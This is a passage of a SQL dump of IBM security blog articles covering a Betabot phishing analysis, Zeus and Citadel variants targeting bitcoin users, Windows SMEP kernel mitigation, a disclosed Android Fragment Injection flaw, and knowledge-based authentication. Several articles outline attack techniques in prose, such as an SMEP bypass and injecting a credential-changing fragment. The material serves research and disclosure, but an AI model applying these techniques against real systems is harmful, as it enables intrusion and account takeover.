'https://securityintelligence.com/six-month-old-vulnerability-exploit-attempt/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (562, 'A (Beta)Bot in a Phish', 'Yong Chuan Koh', '2014-1-2', 'Recently a colleague sent me a .docx which triggered on our scanning engine. Being the optimist me, I personally view such incidents positively; it either proves the accuracy of our engine if it is a true positive, or offers an opportunity to improve the detection logic if it turns out to be a false positive. The .docx comes with an accompanying email: The odd thing to me is that nothing specific is mentioned. For example, what kind of product am I selling, or which of my customers did the sender come in contact with. In a nutshell, all the sender wants is for me to open the poorly-named attachment, Doc1.docx. Okay, so I did: \n     Seemingly there’s a .pdf inserted, which opens only when Protected-Mode is disabled. Once opened, Winword drops the package, “new1 (2).exe”, into the local temp directory. So this is not a .pdf as expected, and is easily achieved: Insert->Object->Package->Choose any executable. The icon image and caption (in this case, “Please Double Click To Open”) can be chosen when “Display as Icon” is checked. \nThe next step is to reverse the (Visual-Basic) executable to determine if this is anything new. A dynamic run is always a good starting point because you get the unpacked code (if packed) almost instantaneously. Under a debugger, it crashes at this point: \n \n It is obvious that this is a result of ESP having the value 0xFF because [EBP-1]==1 at text.0015E754. [EBP-1] is actually a Boolean flag that indicates whether the executable is being debugged, as shown in this manually-decompiled function:\n   So “new1 (2).exe” uses the ZwQueryInformationProcess(…, ProcessInformationClass=ProcessDebugPort, …) technique for anti-debugging. There is another anti-debug attempt in sub_00153796() where it patches the ntdll.DbgBreakPoint(). The rest of this function collects a whole lot of information about the system, machine, installed applications, etc. In the course of reversing, I also came across this function:   Many of these callees are interesting, and reveal the capabilities of “new1 (2).exe”. But I have gathered sufficient information from AntiDebug() and BetaBot_Commands() to achieve my aim: conclude that this is the Betabot malware. Since we already had detection for this malware in place, I didn’t reverse further (stolen files, communication encryption, C&C servers, etc). Lastly, as with all applications, there are at least 2 bugs in Betabot:   That’s all, folks. .docx md5: 73b14e96931b51048302784af0143945 \n“new1 (2).exe” md5: 2976af9b6550823b7786c2f66514902d', '\'IBM X-Force Research\', \'Phishing Attack\'', 'https://securityintelligence.com/beta-bot-phish/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (563, 'Bitcoin Exchange in China: ‘Gameover?’', 'Etay Maor', '2013-12-18', 'Cyber criminals’ interest in bitcoin has continued to grow alongside the mainstream media’s heavy coverage of the currency and its high rate of adoption by both consumers and businesses. The surge in demand for bitcoins in the Chinese market led to the currency’s sharp increase in value while making BTC China the largest bitcoin exchange. While a   by the Chinese government on dealing with third-party bitcoin exchanges has already taken its toll on the currency’s value, we’ve also seen cyber criminals going after the consumers who use bitcoins. The IBM Trusteer security team recently analyzed a malware variant that actively targets BTC China and other platforms for bitcoin exchange. In a previous article, we discussed how   while simultaneously targeting the currency for financial gain. We also discussed how a Citadel variant that we discovered targets and takes screenshots of various virtual currency platforms and bitcoin-related sites as well as underground discussions revolving around the hacking of bitcoin exchanges. The IBM Trusteer security team examined a Zeus P2P/Gameover variant that actively targets BTC China, as can be seen in the extracted code snippet below: This Gameover variant waits until an infected user attempts to log in to the BTC China website. When this occurs, the malware steals the   and username and suspends the session temporarily. Once the cyber criminal has the victim’s credentials, he or she can easily perform an account takeover and assume control of the bitcoins associated with the account. The reason for pausing the session is that the cyber criminal may need to ask the victim for his or her one-time password (OTP). To do so, the malware will use simple social engineering techniques combined with HTML injection and present the victim with a request for the OTP under the false pretense of a   measure. Bitcoin accounts are not just a lucrative target for stealing bitcoins; they can also be used for   from accounts that have been taken over, as recently demonstrated by a Dutch gang. So far, it is worth noting that most cyber criminals, whether they see bitcoin exchange as a platform or a target, are not keen on keeping their capital in bitcoins. Rather, they use the currency as a middleman for laundering funds without leaving any tracks. They sometimes use additional services such as the Tor hidden service “Bitcoin Fog Company” as another way to fight trace-backs. Cyber criminals are clearly not bitcoin’s value speculators — they are interested in quickly monetizing stolen bitcoins or using them as a money laundering mechanism. With the growing use and popularity of this form of currency, we can expect to see more   variants targeting bitcoin exchanges and related sites.', '\'Citadel Malware\', \'Gameover Zeus (GOZ)\', \'HTML\', \'HTML Injection\', \'Malware\', \'Man-in-the-Browser (MitB) Malware\', \'Money Laundering\', \'One-Time Password (OTP)\', \'Password\', \'Zeus Malware\'', 'https://securityintelligence.com/bitcoin-exchange-china-gameover/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (564, 'Mitigating the Exploitation of Vulnerabilities that Allow Diverting Kernel Execution Flow in Windows', 'Nishad Herath', '2013-12-13', 'It is said that an ounce of prevention is worth a pound of cure. This is often true in practice when it comes to securing operating systems against the exploitation of security vulnerabilities. For example from   onwards, Microsoft denies programs the ability to allocate and/or map the “NULL page” (memory residing at virtual address 0x00000000 in the address space). By doing this, Microsoft successfully mitigates the direct exploitation of a whole class of vulnerabilities called “NULL pointer dereference” vulnerabilities. Regardless of where a flaw might be which may result in such a vulnerability, this mitigation reduces the possible impact of its exploitation to a   condition at best from what may have been a potential arbitrary code execution situation. As of Windows 7 Service Pack 1 (SP1) Microsoft has implemented this mitigation in Windows 7 as well. It is reassuring to see Microsoft backporting security mitigation technology originally implemented in Windows 8/8.1, to Windows 7 as well. Now let’s look at vulnerabilities that allow for diverting the kernel execution flow. Prior to Windows 8, the exploitation of such a flaw would allow the attacker to execute code of his choosing in the context of the kernel (under the ring0 CPU privilege level), resulting in privilege escalation to one of the highest levels (only below the level of a virtualization technology hypervisor or a Systems Management Mode handler). Such vulnerabilities would give attackers access to virtually all parts of the operating system because prior to Windows 8, the kernel has access to virtually everything. There was little operating system developers could do to address this problem until Intel introduced the   feature in its Ivy Bridge and later processors. SMEP is an augmentation to the x86/x64 CPU page level protection which uses the existing User/Supervisor flag (U/S) in the page table entries. This page table entry flag is used to mark if a memory page is for User access or Privileged access. When SMEP is enabled by setting the bit 20 of the CR4 control register (CR4.SMEP), if code running with Supervisor privileges (CPU privilege level, CPL <3), such as kernel mode threads, when it tries to access a page that is marked as a User a page, then a page fault is raised by the CPU. The Windows 8/8.1 implementation of this mitigation technology halts the system with a blue screen. As the following excerpt from the Intel CPU manuals show, the   implementation on the CPU is as follows:: – For 32-bit paging or if IA32_EFER.NXE = 0, access rights depend on the value of CR4.SMEP:\n If CR4.SMEP = 0, instructions may be fetched from any linear address with a valid translation.\n If CR4.SMEP = 1, instructions may be fetched from any linear address with a valid translation for which the U/S flag (bit 2) is 0 in at least one of the paging-structure entries controlling the translation.\n – For PAE paging or IA-32e paging with IA32_EFER.NXE = 1, access rights depend on the value of CR4.SMEP:\n If CR4.SMEP = 0, instructions may be fetched from any linear address with a valid translation for which the XD flag (bit 63) is 0 in every paging-structure entry controlling the translation.\n If CR4.SMEP = 1, instructions may be fetched from any linear address with a valid translation for which (1) the U/S flag is 0 in at least one of the paging-structure entries controlling the translation; and (2) the XD flag is 0 in every paging-structure entry controlling the translation.\n – For 32-bit paging or if IA32_EFER.NXE = 0, instructions may be fetched from any linear address with a valid translation for which the U/S flag is 1 in every paging-structure entry controlling the translation.\n – For PAE paging or IA-32e paging with IA32_EFER.NXE = 1, instructions may be fetched from any linear address with a valid translation for which the U/S flag is 1 and the XD flag is 0 in every paging-structure entry controlling the translation.\n A Windows 8/8.1 system halt due to an SMEP violation looks like the above picture. The   supplied is ATTEMPTED_EXECUTE_OF_NO_EXECUTE_MEMORY (0x000000FC). Microsoft describes this BugCheck code  . Well, predictable areas of memory, marked Supervisor, where the content can however be user controlled, depending on the predictability and the degree of user control, can be used to subvert SMEP protection implementation. How would this work? A simple scenario is as follows. – A user mode program indirectly places executable instruction code (shellcode) in kernel memory, marked Supervisor. A typical case where this would be possible is as parameters/data passed from user mode to a kernel service. One of the articles linked to below describes using a set of kernel objects introduced in Windows 7 called Reserve Objects in this fashion.\n – The user mode program triggers a vulnerability which diverts the kernel execution flow to the above predictable address in kernel memory space, where the user has already placed the shellcode. This allows the user crafted executable instruction code to execute in the context of the kernel (in ring0).\n Since the original introduction of the SMEP protection in Windows 8, Microsoft has addressed the issue of such memory areas, for example by marking them non-executable as well, thus making the SMEP protection progressively more robust. That said, it is still possible that such kernel memory areas which could be leveraged to bypass the SMEP protection implementation in Windows 8/8.1 still exists. Yes, it is possible. However, with Address Space Loader Randomization (ASLR) in place, a kernel information disclosure vulnerability is probably required. In addition to that, an application sandbox may prevent the reading of the running kernel image file off disk, thus preventing reasonably locating the required ROP gadgets at runtime. So while it is still possible to leverage ROP in the kernel space when exploiting vulnerabilities that allow diverting kernel execution flow, by implementing mitigation technology that uses the SMEP CPU feature present in Intel Ivy Bridge and newer CPUs by Windows 8/8.1 operatings systems, in conjunction with other mitigation technologies such as ASLR and DEP (Data Execution Prevention), there is no doubt it makes the exploitation of vulnerabilities that allows taking over kernel execution flow a much harder task.', '\'IBM X-Force Research\', \'Microsoft\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Technical & Product\', \'Vulnerabilities\'', 'https://securityintelligence.com/exploitation-vulnerabilities-allow-diverting-kernel-execution-flow-windows/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (565, 'A New Vulnerability in the Android Framework: Fragment Injection', 'Roee Hay', '2013-12-10', 'We have recently disclosed a new vulnerability to the Android Security Team. The vulnerability affected many apps, including   (the one that is found on every Android device),  ,  ,   and  .  To be more accurate,  App which extended the  class using an   activity was automatically vulnerable. A patch has been provided in Android KitKat. If you wondered why your code is now  , it is due to the Android KitKat patch which requires applications to override the new method,  , which has been added to the Android Framework. In this blog post we will begin with a short introduction on Android and its sandbox, and then we will deep-dive into the vulnerability itself. For the sake of simplicity we omitted some of the details which can be found in our  . The UI of Android apps is made of activities. An   provides a single screen with some functionality (for instance: a browser’s bookmarks manager). A   can be considered as a sub-activity. It is a piece of the App’s UI. Fragments provide some flexibility as they allow reuse in different activities. While a Fragment instance is coupled with the Activity it resides inside, different instances can be embedded in different activities. See Figure 1 for the relation between activities and fragments. In Android, apps are isolated from each other and subject to their declared set of permissions by the use of Sandboxing. An app cannot normally access sensitive data of another. That being said, it is possible for one app to invoke application components (such as activities) of another app for feature reuse.  For example, Chrome invokes the Google play app when opening Google Play URLs.  The invocation is done using   which are IPC objects that the source application passes to the corresponding API. Intents do not just specify the target, they also contain data in two places. The first location is the  attribute (of URI type) and the second one is a dictionary ( ) that can contain an arbitrary amount of information (also known as Intent  ). Activities can be invoked by an external app if they are  in the application’s manifest file ( ). Making an activity public (exported) creates a potential hole in the Android Sandbox. Since activities access the input Intent’s data, a bad app can invoke the exported activity and provide it with malicious data, that may trigger vulnerabilities if the data are not properly santizied or validated in the target application. As of Fragments, they can receive input by accessing the embedding activity thus its input Intent or as Fragment-specific arguments. See Figure 2 for an attack outline. The  is a base class (provided by the Android Framework) for showing a hierarchy of preferences to the user. The preferences are associated with a  . The   consumes a few Intent extras. One of them is   which tells the   which fragment to display first. The dynamic Fragment loading is done by a chain of calls which start at the activity creation and end at  (see Figures 3,4). The latter loads the Fragment using the  . Figure 3: Chain of calls in PreferenceActivity ending at Fragment.instantiate (as implemented in Android 4.3) Figure 4: Android 4.3 implementation of Fragment.instantiate. A malicious application can invoke any exported   class and supply it with an   Intent extra in order to make it load an arbitrary class. The goal of the attacker is to execute some code that will break the Android Sandbox, i.e. access sensitive information pertaining to the vulnerable app, or abuse its permissions. Since the attacker cannot supply his own classes as he is limited to ones found under the class loader of the vulnerable app (Android Framework classes and the App classes), the attack is not trivial. In our   we depict a couple of exploit techniques, one of them is pretty cool. The malicious app can make the   load an arbitrary  of the vulnerable app, which is normally loaded inside a non-exported Activity to pratically take it from its natural habitat to a hazardous area where input should not be trusted as the malicious app can now control it.  See Figure 5 for the attack outline. As we mentioned above, all apps which make use of   are vulnerable. We targeted the   app since it is a highly privileged application. By exploiting the the vulnerability we managed to successfully subvert its integrity.  The app’s main activity (which is exported),  , extends   thus it is vulnerable. We searched for interesting fragments in the app’s package, one of them is  . This Fragment is responsible of handling the credentials changing of the device’s lock screen and is subject to the Device Management Policy.  The Fragment’s natural habitat is the   Activity which is  . Normally the  Fragment first asks the user to insert his old credentials (see Figure 6), unless the embedding activity is supplied with an Intent extra, ‘confirm_credentials’ set to false. Since the activity is not exported, this parameter cannot be easily manipulated by a malicious app, however by exploiting the Fragments Injection vulnerability, we can embed the   inside an   activity,   and supply it with malicious data,  set to  . See Figure 7 for the attack outline, and Figure 8 for the result. Since this exploit requires user-intervention it cannot be used remotely thus it requires a physical attacker that wants to change the credentials. Please note that by exploiting this vulnerability the attacker can also override Device Management Policy such as the minimum password requirements.\n   Google  has provided a patch in Android 4.4 KitKat by adding a new protected API,  , which is called before the   is dynamically instantiated by   (see Figure 9). The   method must be overridden otherwise the default implementation throws an exception, as documented in the   We encourage developers to properly implement this method (e.g. as a white-list) since a weak implementation will keep your app vulnerable. Figure 9: Potentially safe Fragment instantiation in Android KitKat. Android 4.3 Jelly Bean and below.  Android 4.4 KitKat. 12/05/2013  Reply from Android Security Team: “Issue is fixed”. \n12/05/2013  Requested a status update. \n11/11/2013  Reply from Android Security Team: “Fix in progress” \n10/24/2013  Requested for status update. \n07/14/2013  Reply from Android Security Team: “We are now looking into the issue”. \n07/12/2013  Disclosure to Android Security Team. The Application Security Research Team researches new security threats and vulnerabilities and provides regular rule updates to AppScan.', '\'Android\', \'Application Security\', \'IBM Security AppScan\', \'IBM X-Force Research\', \'Injection Attacks\', \'Mobile\', \'Mobile Security\', \'Technical & Product\', \'Vulnerabilities\'', 'https://securityintelligence.com/new-vulnerability-android-framework-fragment-injection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (566, 'Enterprises Need to Take Care of the Basics before Worrying about More Sophisticated Threats', 'Chris Poulin', '2013-12-5', 'Circus freak shows are testimony to our fascination with the unique, the bizarre.   ignite the same obsession as they confound us with feats of teleportation past “128 bit encrypted firewalls”, as they say in the movies. Certainly the legends of nation states exploiting zero day vulnerabilities to break into the electrical grid are the articles we gawk over during our morning news intake while   and   are banished to the virtual back pages of technology current events. Mature organizations wrap a manageable process around the technology controls, including change management that tracks the procurement and connection of all new systems and changes to existing systems, and testing them before they’re put into production. But don’t let perfect be the enemy of good: start where you can and chip away at the process. You can never move on from the basics, but you can reduce your effort as that part of your security program matures and becomes a routine that can be offloaded to junior staff—with supervision, of course. The reality is that we’ll never be able to prevent a well-funded and persistent adversary from compromising our defenses. The best we can do is put up large speed bumps to make it exceedingly difficult for the enemy to achieve their goals and to detect their efforts as soon as possible—ultimately before they steal or destroy data. Sometimes the saying, “You don’t have to swim faster than the shark, you only have to swim faster than your dive buddy” holds true and the attacker will move on if you screw up their economics, but even if they are firmly fixated on you as the target, there’s no reason to give up and lay out a red carpet and a warm plate of cheese by not taking care of the basics.', '\'Advanced Persistent Threat (APT)\', \'Cloud\', \'Firewall\', \'IBM X-Force Research\', \'Mobile\', \'SQL Injection\'', 'https://securityintelligence.com/apt-basics-sophisticated-threats-sqli-xss/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (567, 'Cyber Criminal’s Dilemma: Is Bitcoin a Platform or a Target?', 'Etay Maor', '2013-12-5', 'One of the most hotly debated topics on the Internet today is the use of Bitcoins, sometimes referred to as BTC. Not a single day goes by without an article that discusses an aspect of Bitcoin usage. Should it be recognized and used like any other currency? Should one invest in such an unstable, unregulated and unpredictable currency? How do you protect yourself from Bitcoin-stealing malware? The IBM Trusteer security team recently analyzed a malware variant designed specifically to target this kind of information, mining and trading sites and other virtual currency platforms. This Citadel variant captures screenshots of victims’ browsers when they browse the following websites (partial list): While Bitcoin wallet thieves and Bitcoin-mining malware have been around for quite some time now, it seems that cyber criminals are stepping up their game following Bitcoin’s impressive increase in value. In addition to this new Citadel variant, the IBM Trusteer security team has observed an increase in the number of forum posts from members looking for help  , while some cyber criminals are also asking for Bitcoin users’ email databases. Virtual currencies are the bread and butter of cyber crime. Criminals use this form of payment to remain anonymous and protect their identities, both real and virtual. One such currency adopted by cyber criminals not long ago was Liberty Reserve, referred to as LR in underground forums. LR offered users a platform for transferring funds to other users with their email, name and date of birth as the means of identity. No effort was made to validate identities, no limits were set on transactions and most forms of deposit were honored — a true money-laundering paradise. In May 2013, the U.S. Department of Justice charged LR with laundering $6 billion, and its founder was arrested along with six others. According to the New York Southern District Court attorney, “Liberty Reserve was intentionally created and structured to facilitate criminal activity; it was essentially a black market bank.” Cyber criminals were then forced to turn to other means for their transactions. Our security team recently came across a discussion in a closed Russian cyber crime forum in which forum members debated the use of different virtual currencies, mules, secured transactions and, of course, Bitcoins. This fascinating thread included suggestions and tips as well as a discussion on the volatility of Bitcoins and the impact this could have on business. The thread, which included a discussion on the volatility of Bitcoins and what impact this could have on their business, started off with a question from one of the members: Bitcoin’s value had its fair share of ups and downs in 2013, with a price as low as $13 in January soaring to $1,200 at its highest point in late November, surpassing the price of gold. The price has been known to fluctuate following major related events, such as the shutdown of Tor-based drugstore Silk Road or following attacks and hacks of major Bitcoin exchanges. What do cyber criminals think about the current available options when it comes to virtual currencies? The forum members can be roughly divided into three groups: the super secure, the classic virtual currencies supporters (those who use PerfectMoney, WebMoney, Yandex and other virtual currencies) and the Bitcoin enthusiasts. While all forum members were concerned with security, this group takes it a step further. In this thread, there are several examples of how important a secure cash-out is for them. One member wrote of his preferred transacting procedure: Another member pointed out the importance of anonymity in the cash-out process: The use of the cyber criminal’s IP and personal data was raised again by another member: Members of this group are avid supporters of current virtual currencies. They prefer current solutions because they fit their needs and are not as volatile as Bitcoin. One member explained it this way: Another member responded: Other members just do not see a reason to change a system that already works: One group member bluntly put it: Bitcoin supporters form the large majority. These members highlight the ease of use, safety and growing adoption rate of Bitcoins: Others indicate that they have made the move from classic virtual currencies to Bitcoin and they never looked back: Other Bitcoin supporters don’t mind looking into other virtual currencies; however, they do indicate their satisfaction with Bitcoin: And another member posted: These members also dismiss claims regarding Bitcoin’s volatility. Several members noted that while Bitcoins may go down in value (as highlighted by supporters of classic virtual currencies), they usually regain their value and even go up. With the ever-increasing interest in Bitcoins from entrepreneurs, businesses, private users and cyber criminals, we can only expect more malware designed to target this platform. Cyber criminals are enjoying the best of both worlds: On the one hand, they adopted Bitcoins to carry out (relatively) secure and anonymous transactions, while on the other, they are targeting and stealing from unsuspecting victims. No real dilemma here.', '\'Cybercrime\', \'Cybercriminals\', \'Malware\'', 'https://securityintelligence.com/cyber-criminals-dilemma-bitcoin-platform-target/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (568, 'Is the Internet Killing Knowledge Based Authentication?', 'Doug Franklin', '2013-11-21', 'Most of us have encountered  , though we might not have realized it had a name. Think back to a time when you phoned your mortgage or credit card company to discuss your account. They asked you fairly obvious questions, like the account number and the name on the account. However, they probably also asked you questions that may have seemed odd. Perhaps they asked the name of the high school you attended, your address two homes before your current one, or your mother’s maiden name. That was KBA trying to ensure that you really are the authorized account holder. These days, most people encounter KBA most often when they lose or forget the password to one of their accounts. Prior to the evolution of the Internet into a public convenience, these challenges provided a reasonable level of certainty: the answers were expensive to acquire, if it was possible at all. For example, most states place land ownership information (titles and deeds) in the public record. Prior to the “[tooltip text=”By the “utility” Internet, we refer to the Internet of today. It includes so much capability and functionality that it resembles a necessary public utility more than a discretionary tool.”]Utility[/tooltip] Internet, though, accessing those records required travel to the appropriate county court house and poring over dozens or hundreds of bound volumes or microfilm. Finding the name of your first pet often required a personal relationship with you or your family. Determining your mother’s maiden name, likewise, required a personal relationship with you or your family. No more. The utility Internet and the wealth of searchable information it holds have largely eliminated the KBA utility of those challenges, and many more. In fact, it seems like a race between the search engines to “commit homicide” on KBA, and individuals to “commit KBA suicide”. The factoids that  ,  , etc. can’t readily pick up on their own, people seem determined to share with the world on  ,  , et al. Any challenge related to one’s ancestry falls prey to the web genealogy databases, both free and paid. If you’ve never seen one, take a wander through the public portions of   or Brigham Young University’s  . Your mother’s maiden name is one of the first pieces of information you see on the pages related to your immediate family. In addition to employing public records, many of these sites also “crowd source” the information. Similar to Wikipedia, they allow any interested party to add linkages and other information. Some member of your extended family might be enhancing the entries in one of them right now. Have you ever encountered a challenge that used questions from your high school? Which high school did you attend? What city was it in? What was the mascot? What were the school colors? Well,   and its brethren can answer those questions for your adversary. Even questions like   could yield to polls on  ; polls you didn’t even answer. Consider the information commonly included in social media profiles on sites like   or  . Compare that with the questions you’ve been asked to authenticate yourself over the years. City of birth. Birth date. Current city. Name of your first pet. A current pet’s name. And on and on and on.   holds many of the answers, just waiting for an adversary to harvest prior to attacking, say, your bank account, or the server systems and network of your employer. Some challenges sound more reliable than others, but really aren’t. Not any more, at least. Some systems use challenges along the lines of  . If you live in apartments, that one might still provide some value. If you have owned your own homes, though, most jurisdictions make titles and deeds public records. A quick real estate search may be all your adversary requires. And public records reach farther than many people imagine. In most states, birth and death records are public. So are marriage and divorce records. So are many legal proceedings. Sometimes arrest and booking records are public. Trial and conviction records almost always are. Obviously, these sources can provide a lot of information that can undermine typical KBA challenges. “In the old days”, accessing a lot of that information required physically going to the county courthouse in the proper jurisdiction. The “utility” Internet makes most of that information available at the tap of a keyboard. Taking a moment to think more deeply about this, Facebook recently added   to their arsenal. This facility can let an adversary turn this sort of reconnaissance on its head. Suppose an adversary knows that the KBA for a specific bank includes  . Facilities like Graph Search can allow them to get answers to questions like  . A few searches like this, maybe throwing in  , and the attacker can nail down a suite of target individuals having a higher potential for quick success. See   for even scarier possibilities. In case your day hasn’t soured enough yet, think about the number of answers to these questions you’ve given to different organizations over the years. They stored the answers in databases, or they’d be useless as challenges. How many of those vendors have suffered data breaches? Even if you don’t “put it on Facebook”, some data thief may have plundered your answers from the database of some organization with which you have a relationship, say your mortgage or credit card company. Or you might have mentioned it in off-hand remarks on a web forum or mailing list. Let’s avoid thinking about having our entire credit report, tax file, or medical history disclosed to adversaries. The next step in the evolution of KBA challenges trades some convenience for increased security by narrowing the context. For example, a bank might request the account balance from your most recent statement as a challenge. Adversaries would normally find information like this more difficult to locate, since it is tightly bound to specific transactions occurring within the relationship. A bit more secure, a bit more difficult, and a bit less convenient, a vendor might challenge you to provide the amount of the most recent transaction on the account. These sorts of challenges provide considerably more security in some cases: those cases in which both you and your vendor strongly protect your transactional history. They also prove considerably less convenient, since many users must “look up” to answer. Users of “paperless” accounts might find those factoids even easier for the adversary to acquire. Some tout biometrics as a solution to the authentication problem. When most people think of biometric identification, they think of fingerprints, iris scans, or retinal scans. However, biometrics cover much more ground than that. The advent of wearable technology expands that landscape considerably. For example, many smart phones contain accelerometers, and some also feature gyroscopes or magnetometers (compasses). These sensor technologies can enable biometrics based on movements, like individual gaits or gestures. More subtle sensors might allow characterization by sinus rhythm, blood pressure, and other dynamic processes of an individual’s own body. Facial and voice recognition also have a role to play here. On the surface, biometrics seem to solve the same authentication issues that KBA addresses. Biometrics do have certain advantages. Most people don’t have to remember to take along their eyes and fingers, after all. However, common biometrics suffer two significant problems: they cannot be repudiated and some can inadvertently change over time. Getting a new scar on your fingertip can prevent legitimate access to your accounts, or require lengthy reregistration. If your adversaries find a way to impersonate your retinal pattern, you can’t simply change yours. Industry must overcome these two problems before biometrics can function as a useful authentication mechanism. That still leaves at least one hurdle, though. Biometric identification mechanisms can interact with jurisprudence ( ), sometimes in surprising ways. Another potential answer to these difficulties lies in “token” technology, like the common RSA-style “key fob”. These products can provide a very high level of both protection and authentication, as long as the token holder exercises tight physical control over the device. However, they are not foolproof. In 2011, attackers compromised RSA Security’s systems  and made off with information allowing them to impersonate some RSA security tokens. As with challenge answers stored in vendor databases, even tokens provide security that is reliant on a third-party’s system security. Numerous other technologies can act as “tokens” for the purposes of authentication. Such items as smart cards, magnetic stripe cards, and RFID tags can function identically to the tokens discussed above. Newer technologies with more processing power include smart phones and wearable computing. These offer completely new approaches to “something you have” authentication by allowing out-of-band communication and processing as part of the authentication process. For example, a vendor’s authentication process might require that you declare a mobile device number to the host. When special authentication becomes necessary, say you lost your password, the host sends a message to the declared device, and the operator wishing access must supply some artifact of that message through a different interface, say, the Internet. As is so often the case, convenience and security tug at each other in “push-me-pull-you” fashion. Many common KBA challenges work well enough to fend off casual attackers; the ones who don’t perform reconnaissance prior to attack. However, they now provide little in the way of trustworthy authentication once an adversary makes the effort to perform reconnaissance. Even with these weaknesses becoming more widely known , though, news reports show no particular movement away from KBA outside very specialized niches of government and industry. In contrast, authentication largely stays “below the radar” of CISOs . Beware using or answering KBA challenges that can be easily found with an Internet search or in a public records. The answers to those challenges aren’t secure, so they provide little authentication benefit. Before deciding on KBA challenges, you should search for yourself and your friends on the major internet search engines. Review your accounts, and theirs, including those on social media. Check your family ties in genealogical databases. Anything showing up in any of those searches is  a good candidate for a KBA challenge. As with passwords, don’t use the same challenge for multiple sites. Challenges generally do not provide the strength of a password, so users encounter the same difficulties when reusing challenges as when reusing passwords. This can prove difficult, though, due to the situations in which vendors select the challenges. In these cases, the user may not have a good approach to more secure challenges. Align the difficulty of KBA challenges with the value of the credentials they protect. Individuals and organizations providing higher value targets, who will be surveilled prior to attack, must rethink their KBA challenges for high value functions. For example, the possessors of trusted access credentials within a bank or other financial institution must give up some convenience in order to better protect their credentials from subversion. An issue of particular importance here concerns “asymmetry of risk”. As an example, consider an individual bank account. If the credentials controlling that account fall victim to KBA subversion, the risk to the bank is very low. The repercussions have small value compared to the bank’s overall business. As long as such security bypasses occur infrequently, they have no material effect on the business. However, if   bank account is compromised, the repercussions   can be quite severe. This can lead to vendors creating KBA challenges that are appropriately correlated with  view of the risk, but definitely misaligned with the customers’ view of the risk.  By the “utility” Internet, we refer to the Internet of today. It includes so much capability and functionality that it resembles a necessary public utility more than a discretionary tool.  RSA FraudAction Research Labs.  , RSA Speaking of Security weblog. URL https://blogs.rsa.com/anatomy-of-an-attack/   , 27 September 2013. URL http://www.prweb.com/releases/2013/9/prweb11169573.htm   , 27 September 2013. URL http://blogs.csoonline.com/access-control/2791/hack-data-brokers-highlights-weakness-knowledge-based-authentication  According to the IBM 2013 CISO Assessment   (page five), only 12% of CISOs regard “alternative authentication mechanisms” as a high-importance issue for their organization and its security efforts.', '\'Access Management\', \'Authentication\', \'authorization\', \'Biometrics\', \'Identity\', \'Identity and Access Management (IAM)\', \'Security\', \'Technical & Product\'', 'https://securityintelligence.com/is-the-internet-killing-knowledge-based-authentication/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (569, 'The Most Dangerous Malware Trends for 2014', 'Amit Klein', '2013-11-21', 'The common thread running through the malware trends we’ve seen in recent months is the evolution, maturation and diversification of the attacks and fraud schemes they facilitate. Malware, once purpose-built, is clearly becoming a flexible platform — in many respects, it is now almost a commodity. Take, for example, the leak of Carberp’s source code in 2013.   as the latest prominent Man-in-the-Browser malware to become “open.” With access to this source code, cyber criminals can quickly implement a wide variety of attacks and fraud schemes aimed at specific targets. Along with the more traditional and pure in-browser attacks, SMS-stealing attacks are becoming common, researcher evasion is quickly emerging as a malware trend and new approaches to account takeover and remote device control are being encountered more and more frequently.     Not surprisingly, malware is still the most dangerous threat to enterprises, end users and financial institutions. Its success has spawned improved detection and prevention technologies that continue to threaten malware’s existence. This has forced   to evolve their own technologies in order to stay ahead of security vendors. They have responded through diversification, by inventing new fraud mechanics to evade existing security solutions, and commoditization, by turning cutting-edge, limited-circulation techniques into mainstream capabilities. These are indicators that the cyber crime industry is prospering and is able to withstand pressure from advances in  . What’s needed is a disruptive approach to security that addresses the root cause of infections and cyber crime. This approach will need to respond to new cyber crime techniques and malware trends in real time while also providing holistic protection.', '\'Carberp\', \'Cybercriminals\', \'Fraud\', \'Malware\', \'Malware Analysis\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/the-most-dangerous-malware-trends-for-2014/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (570, 'Out of the Shadows: i2Ninja Malware Exposed', 'Etay Maor', '2013-11-20', 'The cyber crime underground provides a robust marketplace for buying and selling different malware variants. Some of the major   families, such as Zeus, Citadel, Ramnit, Spyeye and others, are well known financial malware. Lurking in the dark shadows of the Internet, some cyber criminal groups prefer to keep a low profile and not sell their tool of choice to the general underground public; Torpig, aka Sinowal, is one example of such a case. Trusteer’s security team has identified a new offering in a Russian cyber crime forum, a malware variant that, until now, has been working incognito: the i2Ninja malware. According to a post on the Russian cyber crime forum, i2Ninja offers a similar set of capabilities to those offered by other major financial malware: HTML injection and form-grabbing for all major browsers (Internet Explorer, Firefox and Chrome), a FTP grabber and a soon-to-be-released Virtual Network Connection (VNC) module. In addition, the malware also provides a PokerGrabber module, which targets major online poker sites, and an email grabber. The i2Ninja takes its name from the malware’s use of I2P, a networking layer that uses cryptography to allow secure communication between its peer-to-peer users. While this concept is somewhat similar to TOR and TOR services, I2P was designed to maintain a true Darknet, an Internet within the Internet where secure and anonymous messaging and use of services can be maintained. The I2P network also offers HTTP proxies to allow anonymous Internet browsing. Using the I2P network, i2Ninja can maintain secure communications between the   and command and control server. Everything from delivering configuration updates to receiving stolen data and sending commands is done via the encrypted I2P channels. The i2Ninja malware also offers buyers a proxy for anonymous Internet browsing, promising complete online anonymity. \n Another feature of I2P used by i2Ninja is an integrated help desk via a ticketing system within the malware’s command and control. A potential buyer can communicate with the authors/support team, open tickets and get answers, all while enjoying the security and anonymity provided by I2P’s encrypted messaging. While some malware offerings have featured an interface with a support team in the past (Citadel and Neosploit, to name two), i2Ninja’s 24/7 secure help desk channel is a first. Below is a translation from Russian of the original post introducing the capabilities of i2Ninja: This post was actually copied from a different source and shared within this forum on a 